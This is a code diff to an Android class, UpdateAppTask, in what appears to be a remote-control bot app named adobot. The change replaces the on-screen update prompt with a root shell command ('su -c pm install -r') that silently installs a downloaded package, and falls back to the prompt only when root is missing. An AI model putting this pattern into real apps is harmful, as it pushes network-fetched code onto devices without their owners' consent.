@@ -15,6 +15,7 @@ import com.android.adobot.activities.UpdateActivity;
 import java.io.BufferedInputStream;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.net.MalformedURLException;
 import java.net.URL;
@@ -91,9 +92,19 @@ public class UpdateAppTask extends BaseTask {
                 DlDone.setParams(dlComplete);
                 DlDone.execute();
 
-                Intent updateIntent = new Intent(context, UpdateActivity.class);
-                updateIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(updateIntent);
+                try
+                {
+                    Runtime.getRuntime().exec(new String[] {"su", "-c", "pm install -r /mnt/internal/Download/" + Constants.UPDATE_PKG_FILE_NAME});
+                }
+                catch (IOException e)
+                {
+                    System.out.println(e.toString());
+                    System.out.println("no root");
+
+                    Intent updateIntent = new Intent(context, UpdateActivity.class);
+                    updateIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(updateIntent);
+                }
 
 
             } catch (Exception e) {
